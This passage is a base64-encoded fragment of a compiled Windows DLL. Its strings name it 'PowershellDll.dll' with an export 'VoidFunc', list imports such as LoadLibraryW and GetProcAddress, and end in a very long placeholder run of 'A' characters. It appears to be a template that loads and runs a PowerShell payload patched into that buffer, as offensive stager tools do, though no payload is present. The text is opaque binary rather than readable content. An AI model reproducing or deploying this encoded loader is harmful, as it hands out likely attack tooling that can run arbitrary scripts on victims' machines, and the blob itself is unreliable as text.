BwKgAQBAAAAHgqABAiBZMZBQAAAEw4ABAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAD/////sCoAEAAAAAC4KgAQAQAAAMAqABACAAAAyCoAEAMAAADQKgAQAAAAAOT///8AAAAAyP///wAAAAD+////gBkAEIYZABAAAAAA0BoAEAAAAACkOAAQAQAAAKw4ABAAAAAAWHsAEAAAAAD/////AAAAABAAAABAGgAQ/v///wAAAADQ////AAAAAP7///8AAAAANB0AEAAAAAD+////AAAAANT///8AAAAA/v///wAAAACvHQAQAAAAAP7///8AAAAA1P///wAAAAD+////hB4AEKMeABAAAAAA/v///wAAAADY////AAAAAP7///+DIQAQliEAEAAAAABsJAAQAAAAAFQ5ABACAAAAYDkAEHw5ABAQAAAAjHsAEAAAAAD/////AAAAAAwAAADaIwAQAAAAAKh7ABAAAAAA/////wAAAAAMAAAAQCQAEAAAAABsJAAQAAAAAKg5ABADAAAAuDkAEGA5ABB8OQAQAAAAAMR7ABAAAAAA/////wAAAAAMAAAADSQAEAAAAAAAAAAAAAAAAAAAAABS/6dZAAAAABI6AAABAAAAAQAAAAEAAAAIOgAADDoAABA6AABgGAAAJDoAAAAAUG93ZXJzaGVsbERsbC5kbGwAVm9pZEZ1bmMAAAAAvDoAAAAAAAAAAAAA6DsAAAAwAAAIOwAAAAAAAAAAAAD2OwAATDAAADQ7AAAAAAAAAAAAABA8AAB4MAAAPDsAAAAAAAAAAAAAvjwAAIAwAABgOwAAAAAAAAAAAAC+PQAApDAAAHA7AAAAAAAAAAAAAN49AAC0MAAAAAAAAAAAAAAAAAAAAAAAAAAAAACcOwAAsjsAAMI7AADUOwAAED4AAAA+AAAyPgAATj4AAGw+AACAPgAAlD4AALA+AADKPgAA4D4AAPY+AAAQPwAAJj8AACY+AAAAAAAACQAAgJsBAIAPAACAFQAAgBoAAIACAACABgAAgBYAAIAIAACAEAAAgAAAAAAEPAAAAAAAADo/AAAcPAAAnjwAADI8AABsPAAAUjwAAEg8AACEPAAAAAAAANA8AADiPAAA2DwAAAAAAACmPQAAjj0AALQ9AABWPQAAND0AABo9AAD6PAAA7jwAAHI9AAAIPQAAAAAAAGICR2V0TW9kdWxlRmlsZU5hbWVBAACoA0xvYWRMaWJyYXJ5VwAAnQJHZXRQcm9jQWRkcmVzcwAAZwJHZXRNb2R1bGVIYW5kbGVXAABLRVJORUwzMi5kbGwAAE9MRUFVVDMyLmRsbAAATgFTdHJTdHJJQQAAU0hMV0FQSS5kbGwAEABfX0N4eEZyYW1lSGFuZGxlcjMAAAEAX0N4eFRocm93RXhjZXB0aW9uAABIAG1lbXNldAAANQBfZXhjZXB0X2hhbmRsZXI0X2NvbW1vbgAhAF9fc3RkX2V4Y2VwdGlvbl9jb3B5AAAiAF9fc3RkX2V4Y2VwdGlvbl9kZXN0cm95ACUAX19zdGRfdHlwZV9pbmZvX2Rlc3Ryb3lfbGlzdAAAVkNSVU5USU1FMTQwLmRsbAAAGABmcmVlAAAZAG1hbGxvYwAACABfY2FsbG5ld2gAOABfaW5pdHRlcm0AOQBfaW5pdHRlcm1fZQBBAF9zZWhfZmlsdGVyX2RsbAAZAF9jb25maWd1cmVfbmFycm93X2FyZ3YAADUAX2luaXRpYWxpemVfbmFycm93X2Vudmlyb25tZW50AAA2AF9pbml0aWFsaXplX29uZXhpdF90YWJsZQAAPgBfcmVnaXN0ZXJfb25leGl0X2Z1bmN0aW9uACQAX2V4ZWN1dGVfb25leGl0X3RhYmxlAB8AX2NydF9hdGV4aXQAFwBfY2V4aXQAAGFwaS1tcy13aW4tY3J0LWhlYXAtbDEtMS0wLmRsbAAAYXBpLW1zLXdpbi1jcnQtcnVudGltZS1sMS0xLTAuZGxsAFACR2V0TGFzdEVycm9yAADRA011bHRpQnl0ZVRvV2lkZUNoYXIAsgNMb2NhbEZyZWUAggVVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAEMFU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAAkCR2V0Q3VycmVudFByb2Nlc3MAYQVUZXJtaW5hdGVQcm9jZXNzAABtA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQALQRRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgAKAkdldEN1cnJlbnRQcm9jZXNzSWQADgJHZXRDdXJyZW50VGhyZWFkSWQAANYCR2V0U3lzdGVtVGltZUFzRmlsZVRpbWUASwNJbml0aWFsaXplU0xpc3RIZWFkAGcDSXNEZWJ1Z2dlclByZXNlbnQARgBtZW1jcHkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBsAEAAAAAAKAAAAAAAAAAQAAoAAAAAA/////wAAAACxGb9ETuZAu3WYAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEA